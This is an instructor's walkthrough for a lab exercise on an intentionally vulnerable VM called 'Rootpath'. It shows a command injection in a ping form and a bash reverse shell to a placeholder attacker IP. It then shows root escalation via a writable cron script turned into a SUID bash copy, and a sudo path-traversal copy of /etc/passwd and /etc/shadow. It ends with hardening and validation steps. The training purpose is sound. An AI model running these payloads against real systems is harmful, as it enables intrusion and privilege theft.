# Instructor Walkthrough — Rootpath

Full solution, with evidence and expected output, for the complete attack
chain: discovery → foothold → enumeration → root → remediation → validation.

Target IP: `192.168.56.10`. Attacker workstation: same private network.

---

## Step 1 — Discover the service

```bash
curl http://192.168.56.10/
```

**Expected**: HTTP 200, HTML page titled "Rootpath Diagnostic Tool" with a
form accepting a `host` parameter (network ping diagnostic).

## Step 2 — Exploit the command injection to obtain a foothold

The `host` field is concatenated into a shell command without validation.
First, confirm the injection works with a simple probe:

```bash
curl -X POST -d "host=127.0.0.1; whoami" http://192.168.56.10/
```

**Expected**: the ping output followed by `websvc`, confirming arbitrary
command execution as the `websvc` service account.

### Obtaining an interactive shell (reverse shell)

On the attacker workstation, start a listener:

```bash
nc -lvnp 4444
```

Then inject a reverse-shell payload via the same form field (replace
`<ATTACKER_IP>` with the attacker workstation's IP, reachable from the
target's network):

```bash
curl -X POST -d "host=127.0.0.1; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'" http://192.168.56.10/
```

**Expected**: the listener receives a connection; the attacker now has an
interactive Bash shell as `websvc` on the target.

Confirm the foothold:
```bash
whoami   # websvc
id       # uid=999(websvc) gid=996(websvc) groups=996(websvc)
```

## Step 3 — Enumerate the host

From the `websvc` shell, run the custom enumeration tool (mounted
automatically by Vagrant under `/vagrant`):

```bash
bash /vagrant/scripts/enumerate.sh
```

**Key findings to look for in the output**:
- Section "Writable privileged scripts/directories" should reveal
  `/opt/rootpath/maintenance/cleanup.sh`, owned by `root` but writable by
  the `websvc` group — this is privilege-escalation path A.
- Section "Sudo rights" will show nothing for `websvc` (the sudo path is
  only granted to `operator`, a different account — reached via path A
  in this design, or assumed as a separate access point in the scenario).

## Step 4 — Privilege escalation path A (scheduled task)

Verify the target file is writable:
```bash
echo "test" >> /opt/rootpath/maintenance/cleanup.sh
```

If this succeeds without a permission error, the path is confirmed open.
Append a payload that will run as root on the next cron execution
(runs every minute):

```bash
cat >> /opt/rootpath/maintenance/cleanup.sh << 'EOF'
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
```

Wait slightly over one minute for cron to trigger:
```bash
sleep 65
```

Confirm the SUID copy was created by root:
```bash
ls -la /tmp/rootbash
# expected: -rwsr-xr-x 1 root root ...
```

Escalate:
```bash
/tmp/rootbash -p
whoami   # root
id       # uid=999(websvc) ... euid=0(root) ...
```

Read the root flag:
```bash
cat /root/root.txt
```

**Clean up the artifact after the demo** (also done automatically by
`scripts/reset.sh`):
```bash
rm -f /tmp/rootbash
```

## Step 5 — Privilege escalation path B (sudo rule)

This path is independent of path A. Assuming access to the `operator`
account (e.g. reached through a separate means, or demonstrated directly
for evaluation purposes):

```bash
sudo -l
```

**Expected**:
```
User operator may run the following commands on rootpath-target:
    (root) NOPASSWD: /opt/rootpath/maintenance/backup.sh
```

Confirm the legitimate use works:
```bash
sudo /opt/rootpath/maintenance/backup.sh sample.txt
cat /opt/rootpath/backups/sample.txt.bak
```

Exploit the missing argument validation with a path traversal:
```bash
sudo /opt/rootpath/maintenance/backup.sh ../../../../etc/passwd
cat /etc/passwd.bak
```

**Expected**: the full contents of `/etc/passwd` are readable, proving
root was made to read/copy a file entirely outside the intended
`/opt/rootpath/data` directory.

**Note**: attempting the same technique against `/etc/shadow` will
successfully create `/etc/shadow.bak`, but the copy remains unreadable to
`operator` due to that file's own restrictive permissions — the
vulnerability (root writing outside the intended directory) is proven
either way; readability of the result depends on the target file.

## Step 6 — Reset and harden

Reset the lab to its vulnerable state (re-applies both paths and flags,
cleans up exploitation artifacts):
```bash
sudo bash /vagrant/scripts/reset.sh
```

Apply hardening (fixes all three issues, preserves legitimate features):
```bash
sudo bash /vagrant/scripts/harden.sh
```

## Step 7 — Validate the hardened state

Re-run the same exploitation attempts from steps 2, 4 and 5:
- Command injection: response no longer contains `websvc`, only
  `"Invalid host format."`
- Path A: `echo "test" >> cleanup.sh` as `websvc` now fails with
  "Permission denied".
- Path B: `sudo backup.sh ../../../../etc/passwd` now fails with
  "Error: invalid filename."

Confirm legitimate features still work:
- `curl -X POST -d "host=192.168.56.10" http://192.168.56.10/` still
  returns a valid ping result.
- `sudo backup.sh sample.txt` (as `operator`) still succeeds.

Or simply run the automated suites (see `docs/test-plan.md`):
```bash
sudo bash /vagrant/tests/test_vulnerable.sh   # after reset
sudo bash /vagrant/tests/test_hardened.sh     # after harden
```
